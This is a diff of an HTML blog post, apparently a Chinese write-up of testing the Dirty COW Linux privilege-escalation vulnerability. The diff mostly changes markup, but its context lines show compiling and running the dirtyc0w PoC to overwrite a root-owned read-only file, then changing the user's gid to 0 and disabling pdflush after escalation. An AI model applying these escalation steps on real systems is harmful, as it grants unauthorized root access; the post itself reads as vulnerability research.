@@ -85,11 +85,12 @@
                     <div style="padding:5px 5px 2px 0px;">
                         <i class="fa fa-calendar fa-fw"></i>
                         <time>2016-10-22</time>
-                    </div>
+                        &nbsp;&nbsp;&nbsp;&nbsp;
+                    
 
                     
 
-                    <div style="padding:2px 5px 5px 0px;">
+                    
                         
                         
                         
@@ -116,7 +117,6 @@
 
 <h3 id="0x00-测试环境">0x00 测试环境</h3>
 
-<blockquote>
 <p>我是在本地虚拟机测试的，个人理解这个漏洞的话可以起到的作用是：一个普通用户可以覆盖一个root用户的只读文件，若理解有误则希望大家提意见</p>
 
 <pre><code>CentOS release 6.5
@@ -125,11 +125,9 @@ Linux WYB 3.10.5-3.el6.x86_64 #1 SMP Tue Aug 20 14:10:49 UTC 2013 x86_64 x86_64 
 [reber123@WYB ~]$ id
 uid=502(reber123) gid=502(reber123) groups=502(reber123)
 </code></pre>
-</blockquote>
 
 <h3 id="0x01-创建文件">0x01 创建文件</h3>
 
-<blockquote>
 <p>查看文件权限信息，可以看到属主为root，且只读，权限为0404</p>
 
 <pre><code>[reber123@WYB ~]$ ls -al test
@@ -138,11 +136,9 @@ uid=502(reber123) gid=502(reber123) groups=502(reber123)
 this is not a test
 [reber123@WYB ~]$
 </code></pre>
-</blockquote>
 
 <h3 id="0x02-编译-执行poc">0x02 编译、执行poc</h3>
 
-<blockquote>
 <p>POC保存为a.c，编译为aaa</p>
 
 <pre><code>[reber123@WYB ~]$ gcc -lpthread a.c -o aaa
@@ -159,32 +155,19 @@ mmap f8969000
 xxxxxxxxxxx a test
 [reber123@WYB ~]$
 </code></pre>
-</blockquote>
 
 <h3 id="0x03-后续利用">0x03 后续利用</h3>
 
-<blockquote>
 <p>更改用户gid为0即可
-
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/dirty_cow1.png" alt="脏牛1">
-</div>
-
-<br /><br />
-
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/dirty_cow2.png" alt="脏牛2">
-</div>
-</p>
+<img src="/img/post/dirty_cow1.png" alt="脏牛1" />
+<img src="/img/post/dirty_cow2.png" alt="脏牛2" /></p>
 
 <pre><code>提权后执行下：echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs 
 用来关闭pdflush刷新,否则提权后过几秒系统就会卡死
 </code></pre>
-</blockquote>
 
 <h3 id="0x04-附poc">0x04 附poc</h3>
 
-<blockquote>
 <pre><code>/*
 ####################### dirtyc0w.c #######################
 $ sudo -s
@@ -294,7 +277,6 @@ You have to wait for the threads to finish.
   return 0;
 }
 </code></pre>
-</blockquote>
 
                 
                 <div style="padding:10px 1px;">
@@ -316,7 +298,7 @@ You have to wait for the threads to finish.
   <div class="pure-u-10-24">
     
     <nav class="prev">
-      <a href="http://wyb0.com/posts/code-execution-vulnerabilities-2/">代码执行漏洞2</a>
+      <a href="http://wyb0.com/posts/code-execution-vulnerabilities-2/">代码执行漏洞(二)</a>
     </nav>
     
   </div>
